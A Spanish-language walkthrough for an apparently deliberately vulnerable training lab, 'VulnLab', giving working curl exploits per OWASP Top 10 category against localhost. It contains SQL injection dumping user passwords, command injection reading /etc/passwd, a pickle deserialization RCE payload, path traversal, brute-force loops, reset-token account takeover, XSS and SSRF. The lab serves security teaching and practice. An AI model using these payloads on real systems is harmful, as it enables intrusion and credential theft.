# VulnLab — Exploits por categoría OWASP

> Contenedor en **puerto 8080**. Cada comando muestra la vulnerabilidad activa, no el formulario.

---

## A01 · Broken Access Control — IDOR `/notes`

Accede a la nota privada del admin sin autenticación:

```bash
curl -s "http://localhost:8080/notes?id=1"
```

> Respuesta: nota del admin con la flag `FLAG{sql_injection_found}`

---

## A02 · Cryptographic Failures — `/crypto`

Contraseñas almacenadas en texto plano:

```bash
curl -s http://localhost:8080/crypto | python3 -m json.tool
```

> Respuesta: JSON con usuarios y contraseñas sin hash

---

## A03 · SQL Injection — `/search`

Extrae todos los usuarios y contraseñas con UNION:

```bash
curl -s -G http://localhost:8080/search \
  --data-urlencode "q=' UNION SELECT 1,username,3,4,password FROM users--"
```

> Respuesta: HTML con filas de la tabla `users` completa

---

## A03 · XSS Reflejado — `/search`

Inyecta script que exfiltra cookies:

```bash
curl -s -G http://localhost:8080/search \
  --data-urlencode "q=<script>alert(document.cookie)</script>"
```

> Respuesta: HTML con el script sin escapar

---

## A03 · Command Injection — `/ping`

Lee la flag del sistema:

```bash
curl -s -X POST http://localhost:8080/ping \
  -d "host=127.0.0.1; cat /flag.txt"
```

> Respuesta: output del ping + contenido de `/flag.txt` con `FLAG{cmd_injection_rce}`

Lee `/etc/passwd`:

```bash
curl -s -X POST http://localhost:8080/ping \
  -d "host=127.0.0.1; cat /etc/passwd"
```

---

## A04 · Insecure Design — `/reset` (token predecible)

Solicita token para admin y lo usa directamente (token siempre es `1`):

```bash
curl -s -X POST http://localhost:8080/reset -d "action=request&username=admin"

curl -s -X POST http://localhost:8080/reset \
  -d "action=use&token=1&new_password=hacked123"
```

> El token incremental permite tomar cualquier cuenta

---

## A05 · Security Misconfiguration — `/info`

Expone `secret_key` y variables de entorno:

```bash
curl -s http://localhost:8080/info | python3 -m json.tool
```

---

## A05 · Path Traversal — `/upload`

Escribe fuera del directorio de uploads:

```bash
echo "pwned" > /tmp/pwned.txt
curl -s -X POST http://localhost:8080/upload \
  -F "file=@/tmp/pwned.txt;filename=../../../tmp/traversal_ok.txt"

# Verificar con command injection:
curl -s -X POST http://localhost:8080/ping \
  -d "host=127.0.0.1; cat /tmp/traversal_ok.txt"
```

---

## A06 · Vulnerable Components — `/components`

Lista paquetes instalados con sus versiones (CVEs conocidos):

```bash
curl -s http://localhost:8080/components | python3 -m json.tool
```

---

## A07 · Authentication Failures — `/api/users`

Brute force del token hardcodeado:

```bash
for token in admin secret password token123 api-key 1234; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "X-Token: $token" http://localhost:8080/api/users)
  echo "$token → $code"
done
```

> `token123 → 200` — sin rate limiting ni bloqueo

Acceso con el token encontrado:

```bash
curl -s -H "X-Token: token123" http://localhost:8080/api/users | python3 -m json.tool
```

---

## A08 · Insecure Deserialization — `/deserialize` (Pickle RCE)

Ejecuta código arbitrario y lee la flag:

```bash
PAYLOAD=$(python3 -c "
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt > /tmp/flag_out.txt',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
")

curl -s -X POST http://localhost:8080/deserialize --data-urlencode "data=$PAYLOAD"

curl -s -X POST http://localhost:8080/ping -d "host=127.0.0.1; cat /tmp/flag_out.txt"
```

---

## A09 · Security Logging Failures — `/admin`

Brute force sin dejar ningún rastro en logs:

```bash
for pass in admin 1234 password qwerty admin123; do
  echo -n "$pass → "
  curl -s "http://localhost:8080/admin?password=$pass" \
    | grep -o '"status":"ok"\|"error":"forbidden"'
done
```

Contraste: `/admin-safe` sí registra cada intento:

```bash
for pass in admin 1234 qwerty admin123; do
  curl -s "http://localhost:8080/admin-safe?password=$pass" > /dev/null
done
docker exec vulnlab cat /tmp/security.log
```

---

## A10 · SSRF — `/fetch`

Accede a servicios internos sin token:

```bash
curl -s -G http://localhost:8080/fetch \
  --data-urlencode "url=http://127.0.0.1:5000/api/users"
```

Lee archivos del sistema con `file://`:

```bash
curl -s -G http://localhost:8080/fetch \
  --data-urlencode "url=file:///flag.txt"
```

---

## Mapa de flags

| Flag | Endpoint / técnica |
|------|--------------------|
| `FLAG{sql_injection_found}` | IDOR `/notes?id=1` · SQLi UNION en `/search` |
| `FLAG{cmd_injection_rce}` | Command Injection `/ping`: `cat /flag.txt` |
| `FLAG{api_token_brute}` | `/api/users` con `X-Token: token123` |

---

## Referencia rápida de endpoints

| Endpoint | Método | OWASP |
|----------|--------|-------|
| `/notes` | GET | A01 — IDOR |
| `/crypto` | GET | A02 — Passwords en texto plano |
| `/search` | GET | A03 — SQLi + XSS |
| `/ping` | POST | A03 — Command Injection |
| `/reset` | POST | A04 — Token predecible |
| `/info` | GET | A05 — Info Disclosure |
| `/upload` | POST | A05 — Path Traversal |
| `/components` | GET | A06 — Versiones expuestas |
| `/api/users` | GET | A07 — Token hardcodeado |
| `/auth` | POST | A07 — Sin rate limiting |
| `/deserialize` | POST | A08 — Pickle RCE |
| `/admin` | GET | A09 — Sin logging |
| `/admin-safe` | GET | A09 — Con logging (seguro) |
| `/fetch` | GET | A10 — SSRF |
